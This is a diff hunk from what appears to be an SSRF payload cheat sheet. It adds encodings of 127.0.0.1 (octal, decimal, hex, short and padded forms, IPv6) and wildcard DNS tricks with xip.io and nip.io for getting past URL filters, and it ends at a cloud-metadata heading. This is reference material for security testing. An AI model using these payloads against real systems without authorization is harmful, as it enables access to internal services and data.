@@ -30,11 +30,27 @@ url=http://<your>.oast.pro@target.com/     # user-info trick
 http://127.0.0.1:/ , http://localhost/
 http://0.0.0.0/
 http://[::1]/
+http://[::]            # IPv6 any
 http://0177.0.0.1/     # octal
+http://0177.1/         # octal short
 http://2130706433/     # decimal (127.0.0.1)
+http://520968996/      # decimal — use http://www.subnetmask.info/ to calculate
 http://0x7f.0.0.1/     # hex
+http://0x7f.1/         # hex short
 http://127.1/          # short form
+http://127.000.000.1/  # padded zeros
 http://spoofed.burpcollaborator.net/   # DNS that resolves to 127.0.0.1
+```
+
+Wildcard DNS services (map any IP to a hostname, useful for filter bypasses):
+```
+# xip.io — DNS wildcard: <ip>.xip.io resolves to <ip>
+10.0.0.1.xip.io
+myapp.10.0.0.1.xip.io
+
+# nip.io — same pattern
+10.0.0.1.nip.io
+app.10.0.0.1.nip.io
 ```
 
 Cloud metadata:
